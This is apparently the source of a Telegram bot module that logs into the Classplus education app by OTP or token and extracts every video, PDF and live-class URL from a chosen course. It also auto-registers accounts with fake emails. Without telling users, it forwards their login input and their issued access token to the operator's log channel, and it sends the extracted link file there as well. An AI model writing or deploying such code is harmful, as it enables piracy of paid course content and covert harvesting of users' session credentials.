import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import concurrent.futures
import re
from config import PREMIUM_LOGS, join, BOT_TEXT
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log
import base64
from urllib.parse import urlparse, parse_qs

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

# Global session storage (better to use user-id keyed dict in production)
session_store = {}

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    user_id = message.from_user.id
    try:
        details = await app.ask(
            message.chat.id,
            "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
            "Send **ID & Password** in this format:\n"
            "<code>ORG_CODE*Mobile</code>\n\n"
            "Example:\n"
            "- <code>ABCD*9876543210</code>\n"
            "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
        )
        await forward_to_log(details, "Classplus Extractor")
        user_input = details.text.strip()

        if "*" in user_input:
            org_code, mobile = user_input.split("*", 1)
            if not (mobile.isdigit() and len(mobile) == 10):
                await message.reply("❌ Invalid mobile number. Must be 10 digits.")
                return

            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
                "Accept": "application/json, text/plain, */*",
                "region": "IN",
                "accept-language": "en",
                "Content-Type": "application/json;charset=utf-8",
                "Api-Version": "51",
                "device-id": device_id
            }

            api_base = "https://api.classplusapp.com"

            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # Step 1: Get Org Info
                try:
                    async with session.get(f"{api_base}/v2/orgs/{org_code.strip()}", headers=headers) as resp:
                        org_data = await resp.json()
                        if resp.status != 200 or not org_data.get("data"):
                            err_msg = f"Org fetch failed: {resp.status} | {org_data}"
                            await app.send_message(PREMIUM_LOGS, f"⚠️ Org Error Log (User: {user_id}):\n{err_msg}")
                            await message.reply("❌ Invalid ORG_CODE. Please check and try again.")
                            return
                        org_id = org_data["data"]["orgId"]
                        org_name = org_data["data"]["orgName"]
                except Exception as e:
                    await app.send_message(PREMIUM_LOGS, f"⚠️ Org Fetch Exception (User: {user_id}):\n{str(e)}")
                    await message.reply("❌ Failed to fetch organization. Try again.")
                    return

                # Step 2: Generate OTP
                otp_payload = {
                    'countryExt': '91',
                    'orgCode': org_name,
                    'viaSms': True,
                    'mobile': mobile,
                    'orgId': org_id,
                    'otpCount': 0
                }

                try:
                    async with session.post(f"{api_base}/v2/otp/generate", json=otp_payload, headers=headers) as otp_resp:
                        otp_json = await otp_resp.json()
                        if otp_resp.status != 200:
                            err_detail = f"OTP Gen Failed: {otp_resp.status} | {otp_json}"
                            await app.send_message(PREMIUM_LOGS, f"🔴 OTP Error Log (User: {user_id}):\n{err_detail}")
                            await message.reply("❌ Failed to send OTP. Check ORG/Mobile or retry later.")
                            return

                        session_id = otp_json.get("data", {}).get("sessionId")
                        if not session_id:
                            await message.reply("❌ OTP sent, but session invalid. Try again.")
                            return

                        await message.reply("📲 OTP has been sent to your number!\n"
                                            "Please reply with the 6-digit code (within 5 mins).")

                except Exception as e:
                    await app.send_message(PREMIUM_LOGS, f"🔴 OTP Generation Exception (User: {user_id}):\n{str(e)}")
                    await message.reply("❌ Unexpected error while sending OTP.")
                    return

                # Step 3: Wait for OTP
                try:
                    user_otp_msg = await app.ask(message.chat.id, "Enter OTP:", timeout=300)
                    otp = user_otp_msg.text.strip()
                    if not (otp.isdigit() and len(otp) == 6):
                        await message.reply("❌ Invalid OTP format. Must be 6 digits.")
                        return
                except asyncio.TimeoutError:
                    await message.reply("⏰ OTP input timed out. Please restart with /cp")
                    return

                # Step 4: Verify OTP
                fingerprint_id = str(uuid.uuid4()).replace('-', '')
                verify_payload = {
                    "otp": otp,
                    "countryExt": "91",
                    "sessionId": session_id,
                    "orgId": org_id,
                    "fingerprintId": fingerprint_id,
                    "mobile": mobile
                }

                try:
                    async with session.post(f"{api_base}/v2/users/verify", json=verify_payload, headers=headers) as verify_resp:
                        verify_json = await verify_resp.json()
                        status_code = verify_resp.status

                        if status_code == 200 and verify_json.get("status") == "success":
                            token = verify_json["data"]["token"]
                            await success_login(app, message, token, org_name, user_id)
                            return

                        elif status_code in (201, 409):
                            # Try auto-register
                            email = f"{uuid.uuid4().hex}@gmail.com"
                            reg_payload = {
                                "contact": {"email": email, "countryExt": "91", "mobile": mobile},
                                "fingerprintId": fingerprint_id,
                                "name": "User",
                                "orgId": org_id,
                                "orgName": org_name,
                                "otp": otp,
                                "sessionId": session_id,
                                "type": 1,
                                "viaEmail": 0,
                                "viaSms": 1
                            }
                            async with session.post(f"{api_base}/v2/users/register", json=reg_payload, headers=headers) as reg_resp:
                                reg_json = await reg_resp.json()
                                if reg_resp.status == 200:
                                    token = reg_json["data"]["token"]
                                    await success_login(app, message, token, org_name, user_id)
                                    return
                                else:
                                    await app.send_message(PREMIUM_LOGS, f"🔴 Register Fail (User: {user_id}):\n{reg_resp.status} | {reg_json}")
                                    await message.reply("❌ Registration failed. Wrong OTP or account exists.")
                                    return
                        else:
                            await app.send_message(PREMIUM_LOGS, f"🔴 Verify Fail (User: {user_id}):\n{status_code} | {verify_json}")
                            await message.reply("❌ OTP verification failed. Wrong code?")
                            return

                except Exception as e:
                    await app.send_message(PREMIUM_LOGS, f"🔴 Verification Exception (User: {user_id}):\n{str(e)}")
                    await message.reply("❌ Error during OTP verification.")
                    return

        elif len(user_input) > 20:
            # Token-based login
            token = user_input.strip()
            headers = {
                'x-access-token': token,
                'user-agent': 'Mobile-Android',
                'app-version': '1.4.65.3',
                'api-version': '29',
                'device-id': '39F093FF35F201D9'
            }
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get("https://api.classplusapp.com/v2/courses?tabCategoryId=1", headers=headers) as resp:
                    if resp.status == 200:
                        courses = (await resp.json())["data"]["courses"]
                        org_name = await extract_org_name_from_courses(session, headers, courses)
                        await message.reply("✅ Token accepted! Fetching batches...")
                        session_store[user_id] = {"token": token, "courses": {c["id"]: c["name"] for c in courses}}
                        await fetch_batches(app, message, org_name, user_id)
                    else:
                        await message.reply("❌ Invalid token.")
        else:
            await message.reply("❌ Invalid input format.")

    except Exception as e:
        error_msg = f"🔥 Fatal Error in /cp:\n{str(e)}\n\nUser: `{user_id}`"
        await app.send_message(PREMIUM_LOGS, error_msg)
        await message.reply("❌ Something went wrong. Admins have been notified.")


async def extract_org_name_from_courses(session, headers, courses):
    for course in courses:
        link = course.get("shareableLink", "")
        if "courses.store" in link:
            org_code = link.split('.')[0].split('//')[-1]
            async with session.get(f"https://api.classplusapp.com/v2/orgs/{org_code}", headers=headers) as r:
                if r.status == 200:
                    return (await r.json()).get("data", {}).get("orgName", "Unknown")
        else:
            parts = link.split('//')
            if len(parts) > 1:
                domain = parts[1].split('.')[0]
                return domain.capitalize()
    return "Unknown"


async def success_login(app, message, token, org_name, user_id):
    await message.reply_text(
        "✅ <b>Login Successful!</b>\n\n"
        "🔑 <b>Your Access Token:</b>\n"
        f"<code>{token}</code>"
    )
    await app.send_message(PREMIUM_LOGS, 
        "✅ <b>New Login Alert</b>\n\n"
        f"Org: {org_name}\n"
        f"User: {message.from_user.id} (@{message.from_user.username or 'N/A'})\n"
        f"Token: <code>{token}</code>"
    )

    # Fetch courses
    headers = {
        'x-access-token': token,
        'user-agent': 'Mobile-Android',
        'app-version': '1.4.65.3',
        'api-version': '29',
        'device-id': '39F093FF35F201D9'
    }
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get("https://api.classplusapp.com/v2/courses?tabCategoryId=1", headers=headers) as resp:
            if resp.status == 200:
                courses = (await resp.json())["data"]["courses"]
                session_store[message.from_user.id] = {"token": token, "courses": {c["id"]: c["name"] for c in courses}}
                await fetch_batches(app, message, org_name, message.from_user.id)
            else:
                await message.reply("⚠️ Login OK, but no batches found.")


async def fetch_batches(app, message, org_name, user_id):
    if user_id not in session_store:
        await message.reply("❌ Session expired. Please log in again with /cp")
        return

    session_data = session_store[user_id]
    if "courses" not in session_data or not session_data["courses"]:
        await message.reply("❌ No batches found in your account.")
        return

    courses = session_data["courses"]
    text = "📚 <b>Available Batches</b>\n\n"
    course_list = []
    for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
        text += f"{idx}. <code>{course_name}</code>\n"
        course_list.append((idx, course_id, course_name))

    await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
    try:
        selected_index = await app.ask(
            message.chat.id, 
            f"{text}\n"
            "Send the index number of the batch to download.", 
            timeout=180
        )
    except asyncio.TimeoutError:
        await message.reply("⏰ Batch selection timed out. Use /cp again.")
        return

    if selected_index.text.isdigit():
        selected_idx = int(selected_index.text.strip())
        if 1 <= selected_idx <= len(course_list):
            selected_course_id = course_list[selected_idx - 1][1]
            selected_course_name = course_list[selected_idx - 1][2]
            await app.send_message(
                message.chat.id,
                "🔄 <b>Processing Course</b>\n"
                f"└─ Current: <code>{selected_course_name}</code>"
            )
            await extract_batch(app, message, org_name, selected_course_id, user_id)
        else:
            await message.reply("❌ Invalid index. Please choose from the list.")
    else:
        await message.reply("❌ Please send a number (e.g., 1, 2, 3).")


async def extract_batch(app, message, org_name, batch_id, user_id):
    if user_id not in session_store:
        await message.reply("❌ Session expired. Please log in again with /cp")
        return

    session_data = session_store[user_id]
    if "token" not in session_data:
        await message.reply("❌ Token missing. Re-login with /cp")
        return

    batch_name = session_data["courses"][batch_id]
    headers = {
        'x-access-token': session_data["token"],
        'user-agent': 'Mobile-Android',
        'app-version': '1.4.65.3',
        'api-version': '29',
        'device-id': '39F093FF35F201D9'
    }

    def encode_partial_url(url):
        return url if url else ""

    async def fetch_live_videos(course_id):
        outputs = []
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            try:
                url = f"https://api.classplusapp.com/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                async with session.get(url, headers=headers) as response:
                    j = await response.json()
                    if j.get("data", {}).get("list"):
                        outputs.append(f"\n🎥 LIVE VIDEOS\n{'=' * 12}\n")
                        for video in j["data"]["list"]:
                            name = video.get("name", "Unknown Video")
                            video_url = video.get("url", "")
                            if video_url:
                                decoded_url = encode_partial_url(video_url)
                                outputs.append(f"🎬 {name}: {decoded_url}\n")
            except Exception as e:
                await app.send_message(PREMIUM_LOGS, f"🔴 Live Video Fetch Error:\n{str(e)}")
        return outputs

    async def process_course_contents(course_id, folder_id=0, folder_path="", level=0):
        result = []
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            url = f'https://api.classplusapp.com/v2/course/content/get?courseId={course_id}&folderId={folder_id}'
            async with session.get(url, headers=headers) as resp:
                if resp.status != 200:
                    return [f"⚠️ Failed to load content (status {resp.status})"]
                course_data = (await resp.json())["data"]["courseContent"]

        if level > 0 and folder_path:
            folder_name = folder_path.rstrip(" - ")
            indent = "  " * (level - 1)
            result.append(f"\n{indent}📁 {folder_name}\n{indent}{'=' * (len(folder_name) + 4)}\n")

        for item in course_data:
            content_type = str(item.get("contentType"))
            sub_id = item.get("id")
            sub_name = item.get("name", "Untitled")
            video_url = item.get("url", "")

            if content_type in ("2", "3"):
                indent = "  " * level
                if video_url.lower().endswith('.pdf'):
                    icon = "📄"
                    if sub_name.endswith('.pdf'):
                        sub_name = sub_name[:-4]
                elif any(ext in video_url.lower() for ext in ['.m3u8', '.mp4', '.mpd', 'playlist', 'master', 'drm']):
                    icon = "🎬"
                elif any(ext in video_url.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.webp']):
                    icon = "🖼"
                else:
                    icon = "📄"

                decoded_url = encode_partial_url(video_url)
                result.append(f"{indent}{icon} {sub_name}: {decoded_url}\n")

            elif content_type == "1":
                new_folder_path = f"{folder_path}{sub_name} - "
                sub_content = await process_course_contents(course_id, sub_id, new_folder_path, level + 1)
                result.extend(sub_content)

        return result

    async def write_to_file(extracted_data):
        invalid_chars = '\t:/+#|@*.<>?"'
        clean_name = ''.join(c for c in batch_name if c not in invalid_chars)
        clean_name = clean_name.replace('_', ' ').strip() or "Classplus_Batch"
        file_path = f"{clean_name}.txt"
        with open(file_path, "w", encoding='utf-8') as file:
            file.write(''.join(extracted_data))
        return file_path

    try:
        extracted_data, live_videos = await asyncio.gather(
            process_course_contents(batch_id),
            fetch_live_videos(batch_id)
        )
        extracted_data.extend(live_videos)
        file_path = await write_to_file(extracted_data)

        video_count = sum(1 for line in extracted_data if "🎬" in line and not line.startswith("🎥"))
        pdf_count = sum(1 for line in extracted_data if "📄" in line and not line.startswith("📁"))
        image_count = sum(1 for line in extracted_data if "🖼" in line)
        folder_count = sum(1 for line in extracted_data if "📁" in line and "=" in line)
        live_video_count = sum(1 for line in extracted_data if "🎥 LIVE VIDEOS" in line)
        total_links = len([l for l in extracted_data if any(icon in l for icon in ["🎬", "📄", "🖼"])])

        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> {org_name}\n"
            f"📚 <b>BATCH:</b> {batch_name}\n"
            f"📅 <b>DATE:</b> {time_new} IST\n\n"
            f"📊 <b>CONTENT STATS</b>\n"
            f"├─ 📁 Total Links: {total_links}\n"
            f"├─ 🎬 Videos: {video_count}\n"
            f"├─ 📄 PDFs: {pdf_count}\n"
            f"├─ 🖼 Images: {image_count}\n"
            f"├─ 🎥 Live: {live_video_count}\n"
            f"└─ 📦 Folders: {folder_count}\n\n"
            f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await app.send_document(message.chat.id, file_path, caption=caption)
        await app.send_document(PREMIUM_LOGS, file_path, caption=caption)
        os.remove(file_path)

    except Exception as e:
        await app.send_message(PREMIUM_LOGS, f"🔴 Extraction Error (User: {user_id}):\n{str(e)}")
        await message.reply("❌ Failed to extract course. Report this error to admin.")
